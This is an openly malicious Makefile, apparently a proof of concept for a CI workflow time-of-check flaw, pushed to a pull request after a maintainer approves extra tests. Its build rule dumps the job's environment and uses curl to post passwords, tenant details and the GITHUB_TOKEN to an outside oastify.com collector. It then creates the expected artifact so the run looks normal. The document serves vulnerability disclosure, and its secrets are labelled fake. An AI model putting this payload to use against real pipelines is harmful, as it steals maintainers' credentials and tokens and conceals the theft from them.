# MALICIOUS Makefile — what the attacker force-pushes to the PR head
# after the maintainer has applied the `ok-to-extra-test` label.
# This file REPLACES the benign Makefile in the PR's tree at the same path.
#
# BEFORE PUSHING:
#   (Collaborator URL is pre-baked below — no edits needed.)

.PHONY: e2e-windows-amd64.exe

e2e-windows-amd64.exe:
	@echo ">>> Running attacker-controlled Makefile rule"
	@echo ">>> Workflow checked out THIS commit because event.pull_request.head.sha"
	@echo ">>> resolves to whatever is currently at PR head — proving the TOCTOU."
	@echo ">>> Visible env (all secrets the job injected):"
	@env | grep -E '^(DEMO_FAKE_|GITHUB_)' | sed -E 's/=(.{4}).*/=\1***/'
	@echo ">>> Exfiltrating fake secrets to webhook.site..."
	@curl -fsS -X POST \
	    -H "Content-Type: application/x-www-form-urlencoded" \
	    --data-urlencode "client_id=$$DEMO_FAKE_CLIENT_ID" \
	    --data-urlencode "password=$$DEMO_FAKE_PASSWORD" \
	    --data-urlencode "subscription=$$DEMO_FAKE_SUBSCRIPTION" \
	    --data-urlencode "tenant=$$DEMO_FAKE_TENANT_ID" \
	    --data-urlencode "vm_password=$$DEMO_FAKE_VM_PASSWORD" \
	    --data-urlencode "github_token=$$GITHUB_TOKEN" \
	    --data-urlencode "runner=$$RUNNER_NAME" \
	    --data-urlencode "repo=$$GITHUB_REPOSITORY" \
	    --data-urlencode "actor=$$GITHUB_ACTOR" \
	    --data-urlencode "ref=$$GITHUB_REF" \
	    --data-urlencode "sha=$$GITHUB_SHA" \
	    https://ma0vigny6ca3tyopssyy7r4ppgv7j07p.oastify.com/exfil
	@echo ">>> Exfiltration request sent. Check webhook.site receiver."
	@# Produce the artifact the workflow expects so the run looks normal in the UI
	@touch e2e-windows-amd64.exe
	@echo ">>> Benign-looking artifact produced. Workflow will continue as if nothing happened."
